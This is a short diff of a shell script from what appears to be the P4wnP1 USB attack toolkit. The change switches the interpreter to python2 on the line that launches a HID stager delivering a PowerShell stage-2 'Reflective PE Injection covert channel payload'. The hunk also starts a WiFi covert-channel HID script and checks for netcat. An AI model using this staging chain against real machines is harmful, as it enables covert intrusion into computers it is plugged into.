@@ -17,7 +17,7 @@ ps -aux | grep hidstager.py | grep -v grep | awk {'system("kill "$2)'}
 echo "[*] Starting HID stager for Reflective PE Injection covert channel payload..."
 
 
-python  /usr/local/P4wnP1/legacy/hidstager.py -s -i  /usr/local/P4wnP1/legacy/Stage2.ps1 -o $hidraw &
+python2 /usr/local/P4wnP1/legacy/hidstager.py -s -i /usr/local/P4wnP1/legacy/Stage2.ps1 -o $hidraw &
 P4wnP1_cli hid run -n wifi_covert_channel.js > /dev.null
 
 if ! ps -aux | grep netcat | grep -q -v grep; then
